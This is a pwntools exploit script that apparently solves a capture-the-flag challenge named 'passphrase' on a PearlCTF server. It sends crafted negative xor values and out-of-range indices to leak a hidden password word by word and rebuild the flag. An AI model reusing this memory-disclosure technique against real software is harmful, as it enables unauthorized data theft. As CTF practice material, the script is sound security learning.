#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("passphrase_patched")
context.binary = exe

host = "dyn.ctf.pearlctf.in"
port = 30013

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
breakrva 0x17c6
breakrva 0x1929
breakrva 0x188b
c
'''.format(**locals())

final_flag = b""

for i in range(20):

    io = start()

    # --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

    for _ in range(32):
        sl(str(10).encode())
        
    sla(b"Enter the number to xor with: ", b"-3")

    sla(b"Enter the number to xor with: ", b"4")
    sla(b"Enter the index of the element: ", b"3")

    sla(b"Enter the number to xor with: ", b"-3")

    sla(b"Enter the number to xor with: ", b"4")
    sla(b"Enter the index of the element: ", b"30")

    sla(b"Enter the index: ", str(i).encode()) # skip

    io.recvuntil(b"The password was: \n")
    for j in range(i+1):
        flag = io.recvuntil(b" ")[:-1]
    flag = flag.decode()
    flag = int(flag)
    final_flag += p32(flag)
    io.close()
    
success(final_flag.decode())



